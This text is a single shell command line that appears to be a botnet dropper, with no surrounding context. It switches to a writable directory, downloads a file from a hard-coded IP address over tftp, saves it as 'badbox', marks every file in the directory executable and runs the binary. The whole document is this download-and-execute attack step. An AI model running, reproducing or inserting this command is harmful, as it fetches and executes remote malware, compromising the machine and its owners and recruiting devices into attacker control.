cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ssaaa -g 185.164.32.195;cat ssaaa >badbox;chmod +x *;./badbox
